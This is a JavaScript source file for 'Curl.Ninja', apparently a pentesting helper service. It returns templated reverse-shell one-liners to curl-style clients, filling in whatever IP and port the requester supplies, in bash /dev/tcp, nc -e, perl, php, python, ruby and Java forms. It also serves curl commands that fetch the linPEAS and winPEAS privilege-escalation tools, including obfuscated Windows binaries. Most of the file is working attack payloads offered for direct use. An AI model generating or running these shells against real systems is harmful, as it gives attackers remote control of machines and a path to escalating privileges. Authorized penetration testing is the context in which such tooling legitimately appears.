// CONSTS
const helpText = `
  Welcome to Curl.Ninja!\n
  Try curling the following:
  - /shell
  - /linpeas
  - /winpeas
  - /winpeas64
  \n` 

// Generate shellcode payload
function getShellcode({lang, ip, port}){
  if(!lang || !ip || !port){ 
    return `SYNTAX: /shell/${lang||"LANGUAGE"}/${ip||"IP"}/PORT`
  }
  switch(lang.toLowerCase()){
    case "bash":
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`
    case "java":
      return `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()`
    case "nc":
      return `nc -e /bin/sh ${ip} ${port}`
    case "perl":
      return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    case "php":
      return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`
    case "python":
      return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
    case "ruby":
      return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
    default:
      return `Language "${lang}" is not currently supported :( `
  }
}

function getLinPeas(){
  return `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`
}


function getWinPeas(){
  return `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe`
}

function getWinPeas64(){
  return `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe`
}

// Check the user agent to determine CLI or web response
function checkAgent(req,res){
  // Check inbound user agent
  const userAgent = req.headers[`user-agent`]
  const cliAgents = ["curl", "aria2", "httpie", "wget"].join("|")
  const isCli = new RegExp(cliAgents).test(userAgent)
  return isCli ? handleCliRoute(req,res) : handleWebRoute(req, res)
}

// Determine what CLI payload to return
function handleCliRoute(req,res){
  const { params, url } = req
  const action = url.split("/")[1].toLowerCase() || "help"
  let payload
  switch(action){
    case "shell":
      payload = getShellcode(params)
      break;
    case "linpeas":
      payload = getLinPeas()
      break;
    case "winpeas":
      payload = getWinPeas()
      break;
    case "winpeas64":
      payload = getWinPeas64()
      break;
    default:
      payload = helpText
  }
  res.send(payload)
}

// If not the root path, redirect and show index.html
function handleWebRoute(req, res){
  const { url } = req
  const isRoot = url === "/"
  return isRoot ? res.sendFile(`index.html`, { root: `${__dirname}`}) : res.redirect("/")
}

module.exports = { checkAgent }
